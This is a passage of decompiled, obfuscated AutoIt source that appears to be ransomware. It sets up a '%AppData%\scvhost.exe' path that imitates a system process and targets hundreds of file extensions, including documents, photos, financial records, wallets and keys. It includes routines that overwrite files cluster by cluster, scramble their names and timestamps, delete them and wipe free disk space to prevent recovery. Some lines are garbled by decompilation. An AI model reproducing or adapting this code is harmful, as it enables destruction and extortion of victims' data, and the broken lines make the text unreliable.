	If $72[3] < 1 Or $72[3] > $76[$72[2]] Then Return 0
	If $71[0] < 1 Then Return 1
	If $71[0] < 2 Then Return 0
	If $71[0] = 2 Then $71[3] = "00"
	If Not StringIsInt($71[1]) Then Return 0
	If Not StringIsInt($71[2]) Then Return 0
	If Not StringIsInt($71[3]) Then Return 0
	$71[1] = Int($71[1])
	$71[2] = Int($71[2])
	$71[3] = Int($71[3])
	If $71[1] < 0 Or $71[1] > 23 Then Return 0
	If $71[2] < 0 Or $71[2] > 59 Then Return 0
	If $71[3] < 0 Or $71[3] > 59 Then Return 0
	Return 1
EndFunc
Func _BW($70, ByRef $7K, ByRef $7L)
	Local $7M = StringSplit($70, " T")
	If $7M[0] > 0 Then $7K = StringSplit($7M[1], "/-.")
	If $7M[0] > 1 Then
		$7L = StringSplit($7M[2], ":")
		If UBound($7L) < 4 Then ReDim $7L[4]
	Else
		Dim $7L[4]
	EndIf
	If UBound($7K) < 4 Then ReDim $7K[4]
	For $7N = 1 To 3
		If StringIsInt($7K[$7N]) Then
			$7K[$7N] = Int($7K[$7N])
		Else
			$7K[$7N] = -1
		EndIf
		If StringIsInt($7L[$7N]) Then
			$7L[$7N] = Int($7L[$7N])
		Else
			$7L[$7N] = 0
		EndIf
	Next
	Return 1
EndFunc
Func _BZ($7J, $7O, $7P)
	If Not _BN(StringFormat("%04d/%02d/%02d", $7J, $7O, $7P)) Then
		Return SetError(1, 0, "")
	EndIf
	If $7O < 3 Then
		$7O = $7O + 12
		$7J = $7J - 1
	EndIf
	Local $7Q = Int($7J / 100)
	Local $7R = Int($7Q / 4)
	Local $7S = 2 - $7Q + $7R
	Local $7T = Int(1461 * ($7J + 4716) / 4)
	Local $7U = Int(153 * ($7O + 1) / 5)
	Local $73 = $7S + $7P + $7T + $7U - 1524.5
	Return $73
EndFunc
Func _C1($73, ByRef $7J, ByRef $7O, ByRef $7P)
	If $73 < 0 Or Not IsNumber($73) Then
		Return SetError(1, 0, 0)
	EndIf
	Local $7V = Int($73 + 0.5)
	Local $7W = Int(($7V - 1867216.25) / 36524.25)
	Local $7X = Int($7W / 4)
	Local $7Q = $7V + 1 + $7W - $7X
	Local $7R = $7Q + 1524
	Local $7S = Int(($7R - 122.1) / 365.25)
	Local $7Y = Int(365.25 * $7S)
	Local $7T = Int(($7R - $7Y) / 30.6001)
	Local $7U = Int(30.6001 * $7T)
	$7P = $7R - $7Y - $7U
	If $7T - 1 < 13 Then
		$7O = $7T - 1
	Else
		$7O = $7T - 13
	EndIf
	If $7O < 3 Then
		$7J = $7S - 4715
	Else
		$7J = $7S - 4716
	EndIf
	$7J = StringFormat("%04d", $7J)
	$7O = StringFormat("%02d", $7O)
	$7P = StringFormat("%02d", $7P)
	Return $7J & "/" & $7O & "/" & $7P
EndFunc
Func _C5()
	Return @YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC
EndFunc
Func _CB($7Z, ByRef $80, ByRef $81, ByRef $82)
	If Number($7Z) > 0 Then
		$7Z = Int($7Z / 1000)
		$80 = Int($7Z / 3600)
		$7Z = Mod($7Z, 3600)
		$81 = Int($7Z / 60)
		$82 = Mod($7Z, 60)
		Return 1
	ElseIf Number($7Z) = 0 Then
		$80 = 0
		$7Z = 0
		$81 = 0
		$82 = 0
		Return 1
	Else
		Return SetError(1, 0, 0)
	EndIf
EndFunc
Func _CC($80 = @HOUR, $81 = @MIN, $82 = @SEC)
	If StringIsInt($80) And StringIsInt($81) And StringIsInt($82) Then
		Local $7Z = 1000 * ((3600 * $80) + (60 * $81) + $82)
		Return $7Z
	Else
		Return SetError(1, 0, 0)
	EndIf
EndFunc
Func _CF($7J)
	Local $83 = [12, 31, (_BL($7J) 2928), 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
	Return $83
EndFunc
Func _DJ($84, $85)
	If Not IsNumber($84) Then Return SetError(1, 0, 0)
	If Not IsNumber($85) Then Return SetError(2, 0, 0)
	Return ($84 > $85) $84$85
EndFunc
Func _DK($84, $85)
	If Not IsNumber($84) Then Return SetError(1, 0, 0)
	If Not IsNumber($85) Then Return SetError(2, 0, 0)
	Return ($84 > $85) $85$84
EndFunc
Func _DM($86)
	Local $87 = ProcessList()
	If Not @error Then
		For $18 = 1 To $87[0][0]
			If $87[$18][1] = $86 Then
				Return $87[$18][0]
			EndIf
		Next
	EndIf
	Return SetError(1, 0, "")
EndFunc
Func _DT($88, $4N = 0)
	Local Const $89 = 183
	Local Const $8A = 1
	Local $8B = 0
	If BitAND($4N, 2) Then
		Local $8C = DllStructCreate("byte;byte;word;ptr[4]")
		Local $2R = DllCall("advapi32.dll", "bool", "InitializeSecurityDescriptor", "struct*", $8C, "dword", $8A)
		If @error Then Return SetError(@error, @extended, 0)
		If $2R[0] Then
			$2R = DllCall("advapi32.dll", "bool", "SetSecurityDescriptorDacl", "struct*", $8C, "bool", 1, "ptr", 0, "bool", 0)
			If @error Then Return SetError(@error, @extended, 0)
			If $2R[0] Then
				$8B = DllStructCreate($9)
				DllStructSetData($8B, 1, DllStructGetSize($8B))
				DllStructSetData($8B, 2, DllStructGetPtr($8C))
				DllStructSetData($8B, 3, 0)
			EndIf
		EndIf
	EndIf
	Local $8D = DllCall("kernel32.dll", "handle", "CreateMutexW", "struct*", $8B, "bool", 1, "wstr", $88)
	If @error Then Return SetError(@error, @extended, 0)
	Local $8E = DllCall("kernel32.dll", "dword", "GetLastError")
	If @error Then Return SetError(@error, @extended, 0)
	If $8E[0] = $89 Then
		If BitAND($4N, 1) Then
			DllCall("kernel32.dll", "bool", "CloseHandle", "handle", $8D[0])
			If @error Then Return SetError(@error, @extended, 0)
			Return SetError($8E[0], $8E[0], 0)
		Else
			Exit -1
		EndIf
	EndIf
	Return $8D[0]
EndFunc
Global Const $8F = 64
Global Const $8G = 2048
Global Const $8H = 4096
Global Const $8I = 1
Global Const $8J = 262144
Global Const $8K = 2097152
Global Const $8L = -2147483648
Global Const $8M = 512
Global Const $8N = 128
Func _E0($8O)
	Return BitAND($8O, 12711)
EndFunc
Func _E4($6C, $8P, $8Q, $8R, $8S)
	If $8R = $20 Then
		Local $8O = _EE($6C)
		If Not @error Then
			If (BitAND($8O, 2) = 2) Then $8S = BitOR($8S, 2)
			If (BitAND($8O, 4) = 4) Then $8S = BitOR($8S, 4)
		EndIf
	EndIf
	Local $6Q = DllCall("kernel32.dll", "handle", "CreateFileW", "wstr", $6C, "dword", $8P, "dword", $8Q, "ptr", 0, "dword", $8R, "dword", $8S, "ptr", 0)
	If @error Or ($6Q[0] = Ptr(-1)) Then Return SetError(1, 0, 0)
	Return $6Q[0]
EndFunc
Func _E5($8T)
	Local $1A = DllCall("kernel32.dll", "bool", "DeleteFileW", "wstr", $8T)
	If @error Or (Not $1A[0]) Then
		Return SetError(1, 0, 0)
	Else
		Return 1
	EndIf
EndFunc
Func _EE($6C)
	Local $1A = DllCall("kernel32.dll", "dword", "GetFileAttributesW", "wstr", $6C)
	If @error Or ($1A[0] = 4294967295) Then Return SetError(1, 0, -1)
	Return $1A[0]
EndFunc
Func _EF($6C)
	Local $2R = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceW", "wstr", _EP($6C), "dword*", 0, "dword*", 0, "dword*", 0, "dword*", 0)
	If @error Or (Not $2R[0]) Then Return SetError(1, 0, 0)
	Return ($2R[2] * $2R[3])
EndFunc
Func _EG($6C)
	Local $2R = DllCall("kernel32.dll", "bool", "GetDiskFreeSpaceW", "wstr", _EP($6C), "dword*", 0, "dword*", 0, "dword*", 0, "dword*", 0)
	If @error Or (Not $2R[0]) Then Return SetError(1, 0, 0)
	Return $2R[3]
EndFunc
Func _EJ($8U = @TempDir, $8V = "~", $8W = ".tmp", $8X = 7)
	If Not FileExists($8U) Then Return SetError(1, 0, 0)
	If StringRight($8U, 1) <> "\" Then $8U &= "\"
	Local $8Y
	Do
		$8Y = ""
		While StringLen($8Y) < $8X
			$8Y &= Chr(Random(97, 122, 1))
		WEnd
		$8Y = $8U & $8V & $8Y & $8W
	Until Not FileExists($8Y)
	Return $8Y
EndFunc
Func _EN($8Z, $90)
	Local $1A = DllCall("kernel32.dll", "bool", "MoveFileExW", "wstr", $8Z, "wstr", $90, "dword", 8)
	If @error Or (Not $1A[0]) Then
		Return SetError(1, 0, 0)
	Else
		Return 1
	EndIf
EndFunc
Func _EP($6C)
	Local $91 = _EU($6C)
	If StringRight($91, 1) <> "\" Then $91 &= "\"
	Return $91
EndFunc
Func _EU($6C)
	Local $92 = DllCall("shlwapi.dll", "bool", "PathStripToRootW", "wstr", $6C)
	If @error Or ($92[0] = 0) Then
		Return SetError(1, 0, "")
	Else
		Return $92[1]
	EndIf
EndFunc
Func _EZ($6C, $8O)
	Local $1A = DllCall("kernel32.dll", "bool", "SetFileAttributesW", "wstr", $6C, "dword", _E0($8O))
	If @error Or (Not $1A[0]) Then Return SetError(1, 0, 0)
	Return 1
EndFunc
Func _F1($6C, $93 = False)
	Local $94[1][4] = [[0, 0, 0, 0]]
	_F5($6C)
	Local $6Q = _E4($6C, $26, $23, $21, 0)
	If @error Then Return SetError(3, 0, 0)
	$94[0][3] = _65($6Q)
	Local $95 = _EP($6C)
	Local $96 = _EG($95)
	If @error Then Return SetError(7, 0, 0)
	$94[0][1] = $96
	Local $97 = _EF($95)
	If @error Then Return SetError(8, 0, 0)
	$94[0][2] = $97
	Local $98 = "dword ExtentCount;int64 StartingVcn;struct;int64 NextVcn;int64 Lcn;endstruct"
	Local Const $99 = _F4(9, 28, 3, 0)
	Local $9A = DllStructCreate($98)
	Local $2S, $9B = 0
	Local Const $9C = 0
	Local Const $9D = 234
	Local Const $9E = 38
	Do
		DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $6Q, "dword", $99, "int64*", $9B, "dword", 8, "ptr", DllStructGetPtr($9A), "dword", DllStructGetSize($9A), "dword*", 0, "ptr", 0)
		$2S = _0()
		Switch $2S
			Case $9E
			Case $9D
				$9B = DllStructGetData($9A, "NextVcn")
				ContinueCase
			Case $9C
				$94[0][0] += 1
				ReDim $94[$94[0][0] + 1][4]
				$94[$94[0][0]][0] = DllStructGetData($9A, "StartingVcn")
				$94[$94[0][0]][1] = DllStructGetData($9A, "Lcn")
				$94[$94[0][0]][2] = DllStructGetData($9A, "NextVcn") - DllStructGetData($9A, "StartingVcn")
			Case Else
		EndSwitch
	Until ($2S <> $9D)
	_48($6Q)
	If $94[0][0] = 0 Then
		Return SetError(4, $2S, $94)
	ElseIf Not $93 Then
		Return $94
	Else
		Local Const $9F = _F4(86, 8, 0, 0)
		Local $9G = "ulong NumberOfPhysicalOffsets"
		For $9H = 1 To 8
			$9G &= ";struct;ulong DiskNumber" & $9H & ";int64 Offset" & $9H & ";endstruct"
		Next
		$2S = 0
		If Not StringRegExp(StringLeft($95, 1), "(?i)[a-z]") Then Return SetError(5, 0, $94)
		Local $9I = _E4("\\.\" & StringLeft($95, 1) & ":", $26, BitOR($23, $24), $21, 0)
		If @error Then Return SetError(5, 0, $94)
		Local $9J = DllStructCreate($9G)
		Local $2R, $9K[1][2]
		For $18 = 1 To $94[0][0]
			If $94[$18][1] = -1 Then ContinueLoop
			$2R = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $9I, "dword", $9F, "int64*", $94[$18][1] * $97, "dword", 8, "ptr", DllStructGetPtr($9J), "dword", DllStructGetSize($9J), "dword*", 0, "ptr", 0)
			If @error Or (Not $2R[0]) Or (Not $2R[7]) Then
				$2S += 1
				ContinueLoop
			EndIf
			$9K[0][0] = DllStructGetData($9J, "NumberOfPhysicalOffsets")
			ReDim $9K[$9K[0][0] + 1][2]
			For $3X = 1 To $9K[0][0]
				$9K[$3X][0] = DllStructGetData($9J, "DiskNumber" & $3X)
				$9K[$3X][1] = DllStructGetData($9J, "Offset" & $3X)
			Next
			$94[$18][3] = $9K
		Next
		_48($9I)
		If $2S Then
			Return SetError(6, $2S, $94)
		Else
			Return $94
		EndIf
	EndIf
EndFunc
Func _F4($9L, $9M, $9N, $9O)
	Return BitOR(BitShift($9L, -16), BitShift($9O, -14), BitShift($9M, -2), $9N)
EndFunc
Func _F5(ByRef $6C)
	If StringRight($6C, 1) = ":" Then
		$6C &= "\"
	Else
		$6C = _3T($6C)
	EndIf
EndFunc
Global $9P = 0, $9Q = (1024 ^ 2) * 2, $9R[2] = [0, 0]
OnAutoItExitRegister("_fh")
Func _F8($8T, $9S = -1, $9T = True, $9U = "", $8O = Default)
	If $8O = Default Then
		$8O = _EE($8T)
		If @error Then Return SetError(1, 0, 0)
	EndIf
	If _FI($8O) Then Return SetError(2, 0, 0)
	If _FJ($8O) Then
		If $9T Then
			_FF($8T)
			If @error Then
				Return SetError(9, 0, 0)
			Else
				Return 1
			EndIf
		Else
			Return 1
		EndIf
	EndIf
	_FC($9S)
	Switch @error
		Case 1
			Return SetError(3, 0, 0)
		Case 2
			Return SetError(6, 0, 0)
	EndSwitch
	Local $6Q, $9V = 1, $9W, $9X, $9Y = 0
	Local $9Z = _F1($8T)
	Switch @error
		Case 0, 4
			If (@error = 0) And _FK($8O) Then $9V = 2
		Case Else
			Return SetError(4, 0, 0)
	EndSwitch
	Switch $9V
		Case 1
			$6Q = _E4($8T, $25, BitOR($23, $24), $21, -1879048192)
			If Not $6Q Then Return SetError(5, 0, 0)
			If $9Z[0][3] > $9Q Then
				$9W = $9Q
			Else
				$9W = 1024 * 64
			EndIf
			_EZ($8T, 128)
			_FM($6Q, $9Z[0][3], $9W, $9S, $9U)
			If @error Then $9Y = 1
			_48($6Q)
			If $9Y Then Return SetError(7, 0, 0)
		Case 2
			Local $95 = _EP($8T)
			Local $A0 = _EJ($95)
			$6Q = _E4($A0, $25, 0, $1Z, -1275068414)
			If @error Then Return SetError(8, 0, 0)
			If $9Z[0][3] > $9Q Then
				$9W = Floor($9Q / ($9Z[0][2] * 16)) * ($9Z[0][2] * 16)
			Else
				$9W = Floor(1024 * 64 / ($9Z[0][2] * 16)) * ($9Z[0][2] * 16)
			EndIf
			If $9W = 0 Then $9W = $9Z[0][2] * 16
			$9X = $9W / $9Z[0][2]
			DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $6Q, "int64", $9W, "ptr", 0, "dword", 0)
			_8M($6Q)
			Local Const $A1 = _F4(9, 29, 0, 0)
			Local $A2 = "handle FileHandle;int64 StartingVcn;int64 StartingLcn;dword ClusterCount"
			Local $A3 = DllStructCreate($A2)
			DllStructSetData($A3, "FileHandle", $6Q)
			DllStructSetData($A3, "StartingVcn", 0)
			If Not StringRegExp(StringLeft($95, 1), "(?i)[a-z]") Then
				_48($6Q)
				Return SetError(9, 0, 0)
			EndIf
			Local $9I = _E4("\\.\" & StringLeft($95, 1) & ":", $26, BitOR($23, $24), $21, 0)
			If @error Then
				_48($6Q)
				Return SetError(9, 0, 0)
			EndIf
			_EZ($8T, 128)
			$9T = False
			_FF($8T)
			If @error Then
				_48($9I)
				_48($6Q)
				Return SetError(9, 0, 0)
			EndIf
			Local $2R, $A4, $A5, $A6 = 0, $A7 = 0
			Local $A8 = 0
			If $9U Then
				For $18 = 1 To $9Z[0][0]
					If $9Z[$18][1] = -1 Then ContinueLoop
					$A8 += $9Z[$18][2]
				Next
			EndIf
			For $18 = 1 To $9Z[0][0]
				If $9Z[$18][1] = -1 Then ContinueLoop
				$A4 = $9Z[$18][1]
				$A5 = $9X
				DllStructSetData($A3, "ClusterCount", $9X)
				$A6 = 0
				While $A6 < $9Z[$18][2]
					If $A5 > ($9Z[$18][2] - $A6) Then
						$A5 = $9Z[$18][2] - $A6
						DllStructSetData($A3, "ClusterCount", $A5)
					EndIf
					DllStructSetData($A3, "StartingLcn", $A4)
					$2R = DllCall("kernel32.dll", "bool", "DeviceIoControl", "handle", $9I, "dword", $A1, "ptr", DllStructGetPtr($A3), "dword", DllStructGetSize($A3), "ptr", 0, "dword", 0, "dword*", 0, "ptr", 0)
					If Not $2R[0] Then
						$9Y += 1
					EndIf
					DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $6Q, "int64", 0, "ptr", 0, "dword", 0)
					_FM($6Q, $A5 * $9Z[0][2], $A5 * $9Z[0][2], $9S)
					$A4 += $A5
					$A6 += $A5
					If $9U Then
						$A7 += $A5
						Call($9U, Ceiling($A7 * $9Z[0][3] / $A8), $9Z[0][3])
					EndIf
				WEnd
			Next
			_48($9I)
			_48($6Q)
	EndSwitch
	If $9T Then
		_FF($8T)
		If @error Then Return SetError(9, 0, 0)
	EndIf
	If $9Y Then
		Return SetError(10, $9Y, 0)
	Else
		Return 1
	EndIf
EndFunc
Func _F9($95, $9S = -1, $9U = "")
	$95 = StringLeft($95, 1) & ":\"
	If Not FileExists($95) Then Return SetError(1, 0, 0)
	_FC($9S)
	Switch @error
		Case 1
			Return SetError(2, 0, 0)
		Case 2
			Return SetError(4, 0, 0)
	EndSwitch
	Local $97 = _EF($95)
	Local $A9, $9W, $A0
	Local $AA = DriveSpaceFree($95) * (1024 ^ 2)
	Local $6T = 0
	Do
		$9W = Floor($9Q / $97) * $97
		If $9W = 0 Then $9W = $97
		$A0 = _EJ($95)
		If @error Then
			Return SetError(3, 0, 0)
		Else
			$A9 = _E4($A0, $25, 0, $1Z, -1275068414)
			If @error Then
				Return SetError(5, 0, 0)
			Else
				While $9W > $97
					_FM($A9, $9W, $9W, $9S)
					If @error Then
						$9W -= $97
					ElseIf $9U Then
						$6T += $9W
						Call($9U, $6T, $AA)
					EndIf
				WEnd
			EndIf
		EndIf
	Until (Floor(DriveSpaceFree($95) * (1024 ^ 2)) < $97)
	$9W = $97
	$A0 = _EJ($95)
	If @error Then
		Return SetError(3, 0, 0)
	Else
		$A9 = _E4($A0, $25, 0, $1Z, -1811939326)
		If @error Then
			Return SetError(5, 0, 0)
		Else
			While $9W
				_FM($A9, $9W, $9W, $9S)
				If @error Then $9W -= 1
			WEnd
		EndIf
	EndIf
	Local $AB = 4096
	Local $AC = False
	While 1
		$A0 = _EJ($95)
		If @error Then
			Return SetError(3, 0, 0)
		EndIf
		$A9 = _E4($A0, $25, 0, $1Z, -1811939326)
		If @error Then ExitLoop
		$9W = $AB
		$AC = False
		While $9W
			_FM($A9, $9W, $9W, $9S)
			If @error Then
				$9W -= 1
			Else
				$AC = True
				$AB = $9W
			EndIf
		WEnd
		If Not $AC Then ExitLoop
	WEnd
	Return 1
EndFunc
Func _FC(Const ByRef $9S)
	Static Local $AD = Default
	If IsArray($9S) And UBound($9S, 0) > 1 Then Return SetError(1)
	If IsArray($9P) Then
		If IsArray($9S) And IsArray($AD) Then
			If UBound($9S) = UBound($AD) Then
				For $18 = 0 To UBound($9S) - 1
					If $9S[$18] <> $AD[$18] Then ExitLoop
				Next
				If $18 = UBound($9S) Then Return
			EndIf
		ElseIf (Not IsArray($9S)) And (Not IsArray($AD)) Then
			If $9S = $AD Then Return
		EndIf
	EndIf
	Local $AE
	If IsArray($9S) Then
		For $18 = 0 To UBound($9S) - 1
			If ($9S[$18] < -1) Or ($9S[$18] > 255) Then Return SetError(1)
		Next
		$AE = $9S
	ElseIf IsNumber($9S) Then
		If $9S = -1 Then
			Dim $AE[3]
			$AE[0] = Random(0, 255, 1)
			$AE[1] = BitAND(BitNOT($AE[0]), 255)
			$AE[2] = Random(0, 255, 1)
		ElseIf ($9S < 0) Or ($9S > 255) Then
			Return SetError(1)
		Else
			Dim $AE[1] = [$9S]
		EndIf
	Else
		Return SetError(1)
	EndIf
	$AD = $9S
	_FD($AE)
	If @error Then Return SetError(2)
EndFunc
Func _FD(Const ByRef $AE)
	Local $AF
	_FH()
	$9R[1] = DllOpen("advapi32.dll")
	Local $AG = DllCall($9R[1], "bool", "CryptAcquireContext", "handle*", 0, "ptr", 0, "ptr", 0, "dword", 24, "dword", -268435456)
	If @error Or (Not $AG[0]) Then
		DllClose($9R[1])
		$9R[1] = 0
		Return SetError(1)
	EndIf
	$9R[0] = $AG[1]
	Dim $9P[1] = [0]
	For $18 = 0 To UBound($AE) - 1
		$AF = _W(0, $9Q, $0, $1)
		If Not $AF Then
			_FH()
			Return SetError(1)
		EndIf
		If $AE[$18] > -1 Then
			DllCall("ntdll.dll", "none", "RtlFillMemory", "ptr", $AF, "ulong_ptr", $9Q, "byte", $AE[$18])
		EndIf
		$9P[0] += 1
		ReDim $9P[$9P[0] + 1]
		$9P[$9P[0]] = $AF
	Next
EndFunc
Func _FF($8T)
	Local $AH = $8T
	_48(_E4($8T, $25, $23, $22, 0))
	Local $AI
	Local $AJ = StringRegExpReplace($8T, "^(.*)\\.*?$", "${1}")
	For $18 = 1 To 10
		$AI = _EJ($AJ)
		If Not _EN($8T, $AI) Then ExitLoop
		$8T = $AI
	Next
	For $18 = 0 To 2
		FileSetTime($8T, "19800101010001", $18)
	Next
	If Not _E5($8T) Then
		_EN($8T, $AH)
		Return SetError(1)
	EndIf
EndFunc
Func _FG($AF, $B)
	Local $1A = DllCall($9R[1], "bool", "CryptGenRandom", "handle", $9R[0], "dword", $B, "ptr", $AF)
	If @error Or (Not $1A[0]) Then
		Return SetError(1)
	Else
		Return 1
	EndIf
EndFunc
Func _FH()
	If IsArray($9P) Then
		For $18 = 1 To $9P[0]
			_Y($9P[$18], 0, $3)
		Next
	EndIf
	$9P = 0
	If $9R[0] Then DllCall($9R[1], "bool", "CryptReleaseContext", "handle", $9R[0], "dword", 0)
	If $9R[1] Then DllClose($9R[1])
	$9R[0] = 0
	$9R[1] = 0
EndFunc
Func _FI($8O)
	Return (BitAND($8O, 16) = 16)
EndFunc
Func _FJ($8O)
	Return (BitAND($8O, 1024) = 1024)
EndFunc
Func _FK($8O)
	Return ((BitAND($8O, 512) = 512) Or (BitAND($8O, 2048) = 2048) Or (BitAND($8O, 16384) = 16384))
EndFunc
Func _FM($6Q, $B, $AK, Const ByRef $9S, $9U = "")
	If $AK > $9Q Then $AK = $9Q
	Local $AL, $AM, $AN = $AK
	$AM = 0
	While $AM < $B
		If $AN > ($B - $AM) Then $AN = $B - $AM
		For $18 = 1 To $9P[0]
			If $18 > 1 Then
				DllCall("kernel32.dll", "bool", "SetFilePointerEx", "handle", $6Q, "int64", -$AN, "ptr", 0, "dword", 1)
			EndIf
			If IsArray($9S) And ($9S[$18 - 1] = -1) Then _FG($9P[$18], $AN)
			If (Not _9N($6Q, $9P[$18], $AN, $AL)) Or ($AN <> $AL) Then
				Return SetError(1)
			EndIf
		Next
		$AM += $AN
		If $9U Then Call($9U, $AM, $B)
	WEnd
EndFunc
If Not @Compiled Then Exit
_GA("Instance opened")
_G8()
_G9()
Global Const $68 = @AppDataDir & "\" & _FZ(_G0() & "data")
Global Const $AO = @AppDataDir & "\scvhost.exe"
Global Const $62 = @AppDataDir & "\" & _FZ(_G0() & "ls")
Global $4M = "*.jpg;*.jpeg;*.gif;*.bmp;*.tiff;*.c;*.doc;*.docx;*.ppt;*.pptx;*.xls;*.xlsx;*.mov;*.mp3;*.cpp;*.au3;*.pas;*.php;*.wav;*.wma;*.wmv;*.mp4;*.rar;*.zip;*.7z;*.001;*.html;*.pdf;*.txt;*.ai;*.dmg;*.dwg;*.ps;*.flv;*.xml;*.skp;*.aiml;*.sql;*.cdr;*.svg;*.png;*.ico;*.ani;*.m4a;*.avi;*.csv;*.d3dbsp;*.sc2save;*.sie;*.sum;*.ibank;*.t13;*.t12;*.qdf;*.gdb;*.tax;*.pkpass;*.bc6;*.bc7;*.bkp;*.bak;*.qic;*.bkf;*.sidn;*.sidd;*.mddata;*.itl;*.itdb;*.icxs;*.hvpl;*.hplg;*.hkdb;*.mdbackup;*.syncdb;*.gho;*.cas;*.map;*.wmo;*.itm;*.sb;*.fos;*.mcgame;*.vdf;*.ztmp;*.sis;*.sid;*.ncf;*.menu;*.layout;*.dmp;*.blob;*.esm;*.001;*.vtf;*.dazip;*.fpk;*.mlx;*.kf;*.iwd;*.vpk;*.tor;*.psk;*.rim;*.w3x;*.fsh;*.ntl;*.arch00;*.lvl;*.snx;*.cfr;*.ff;*.vpp_pc;*.lrf;*.m2;*.mcmeta;*.vfs0;*.mpqge;*.kdb;*.db0;*.DayZProfile;*.rofl;*.hkx;*.bar;*.upk;*.das;*.iwi;*.litemod;*.asset;*.forge;*.ltx;*.bsa;*.apk;*.re4;*.sav;*.lbf;*.slm;*.bik;*.epk;*.rgss3a;*.pak;*.big;*.unity3d;*.wotreplay;*.xxx;*.desc;*.py;*.m3u;*.js;*.css;*.rb;*.p7c;*.p7b;*.p12;*.pfx;*.pem;*.crt;*.cer;*.der;*.x3f;*.srw;*.pef;*.ptx;*.r3d;*.rw2;*.rwl;*.raw;*.raf;*.orf;*.nrw;*.mrwref;*.mef;*.erf;*.kdc;*.dcr;*.cr2;*.crw;*.bay;*.sr2;*.srf;*.arw;*.3fr;*.dng;*.cdr;*.indd;*.eps;*.pdd;*.psd;*.dbfv;*.mdf;*.wb2;*.rtf;*.wpd;*.dxg;*.xf;*.pst;*.accdb;*.mdb;*.pptm;*.ppsx;*.pps;*.xlk;*.xlsb;*.xlsm;*.wps;*.docm;*.odb;*.odc;*.odm;*.odp;*.ods;*.odt;*.json;*.dat;*.csv;*.efx;*.sdf;*.vcf;*.ses;*.wallet;*.1password;*.write;*.ini;*.axx;*.md;*.manifest;*.aes;*.fdb;*.gdb;*.fdk;*.gdk;*.db;*.veg;*.3ds;*.anim;*.bvh;*.cpp;*.fxa;*.ge2;*.iff;*.ma;*.mb;*.mcfi;*.mcfp;*.mel;*.mll;*.mp;*.mtl;*.obj;*.ogex;*.raa;*.rtg;*.skl;*.soft;*.spt;*.swatch;*.vrimg;*.gdb;*.tax;*.2015;*.qif;*.t14;*.qdf;*.ofx;*.qfx;*.t13;*.ebc;*.ebq;*.iif;*.t12;*.ptb;*.tax2014;*.qbw;*.mye;*.qbm;*.myox;*.ets;*.tax2012;*.tax2013;*.tt14;*.lgb;*.epb;*.500;*.txf;*.tax2011;*.qbo;*.t11;*.t15;*.gpc;*.tax2015;*.tlg;*.qtx;*.itf;*.tt13;*.t10;*.qsd;*.ibank;*.ofc;*.bc9;*.tax2010;*.13t;*.mny;*.qxf;*.amj;*.m14;*._vc;*.tbp;*.qbk;*.aci;*.npc;*.sba;*.qbmb;*.cfp;*.nv2;*.tt12;*.n43;*.tfx;*.let;*.des;*.210;*.dac;*.slp;*.tax2009;*.qb2013;*.qbx;*.saj;*.ssg;*.zdb;*.t09;*.tt15;*.epa;*.qch;*.qby;*.tax2008;*.pd6;*.qbr;*.ta1;*.rdy;*.sic;*.lmr;*.pr5;*.op;*.brw;*.asec;*.pkpass;*.crypt8;*.crypt;*.obb;*.crypt12;*.crypt7;*.rem;*.ksd;*.db.crypt8;*.sdtid;*.iwa;*.sme;*.crypt10;*.vdata;*.key;*.menc;*.acsm;*.crypt5;*.p7s;*.aee;*.crypt9;*.jpgenx;*.db.crypt7;*.awsec;*.adoc;*.key;*.eslock;*.slm;*.emc;*.pp7m;*.p7e;*.signed;*.ftil;*.sec;*.jse;*.pem;*.gpg;*.p7m;*.ize;*.ple;*.tc;*.crypted;*.vsf;*.enc;*.ifs;*.jpgx;*.p7z;*.uhh;*.cxt;*.bioexcess;*.pgp;*.cip;*.mse;*.aes;*.aes256;*.c2v;*.hds;*.muk;*.dcv;*.pi2;*.lgb;*.eoc;*.pdc;*.mpqe;*.enc;*.ee;*.kdbx;*.egisenc;*.dc4;*.hde;*.pfx;*.hid2;*.spk;*.rgss2a;*.cng;*.p12;*.flka;*.sth;*.afp;*.rfp;*.rsa;*.wbp;*.hsh;*.ekb;*.lf;*.v2c;*.flk;*.lock3;*.uea;*.aex;*.wbc;*.cfd;*.enc;*.sef;*.clk;*.leotmi;*.hid;*.crypt6;*.base64;*.safe;*.asc;*.pde;"
$4M &= "*.lxv;*.skr;*.jsn;*.kwm;*.apw;*.hc;*.vmdf;*.k2p;*.kdb;*.db.crypt5;*.cfe;*.daf;*.pkk;*.dim;*.img3;*.pkr;*.secure;*.rxf;*.cgp;*.dsc;*.xdb;*.epf;*.keychain;*.p7x;*.puf;*.enk;*.switch;*.mck;*.edc;*.auth;*.docenx;*.uue;*.prv;*.stxt;*.zbb;*.eff;*.dwk;*.fpa;*.sign;*.mfs;*.sdsk;*.pdfenx;*.pwl;*.embp;*.ecr;*.mnc;*.czip;*.mim;*.ppenc;*.csj;*.edat;*.ueaf;*.jpegenx;*.eea;*.devicesalt;*.pae;*.mcrp;*.p7m;*.cng;*.zix;*.jbc;*.daz;*.nip;*.dsa;*.lma;*.hdt;*.bfa;*.migitallock;*.flkb;*.xia;*.1pif;*.kgb;*.kde;*.cpt;*.hop;*.kge;*.bfe;*.svz;*.ibe;*.bpk;*.tzp;*.bnc;*.ptxt;*.sgz;*.xef;*.flkw;*.crl;*.wmt;*.poo;*.cyp;*.uu;*.vf3;*.pkcs12;*.rsdf;*.xcon;*.ad;*.vp;*.meo;*.docxenx;*.sdc;*.pf;*.efa;*.mbz5;*.rpz;*.cry;*.qze;*.saa;*.wmg;*.sjpg;*.pvk;*.alk;*.afs3;*.lp7;*.txtenx;*.abc;*.opef;*.eee;*.agilekeychain;*.vme;*.$efs;*.gte;*.egs;*.mkeyb;*.fve;*.pandora;*.rdz;*.wza;*.jpi;*.smbp;*.pjpg;*.efu;*.xmm;*.paw;*.rte;*.rbb;*.atc;*.azf;*.suf;*.isk;*.xrm-ms;*.x26;*.cef;*.apv;*.sxl;*.rarenx;*.xlsxenx;*.awsec;*.db;*.ontx;*.rae;*.___fpe;*.passwordwallet4;*.zipenx;*.dwx;*.uenc;*.sxml;*.aos;*.dse;*.a2r;*.xxe;*.avn;*.sef;*.pwa;*.xlsenx;*.zbd;*.efl;*.azs;*.efr;*.sde;*.psw;*.sdo;*.ae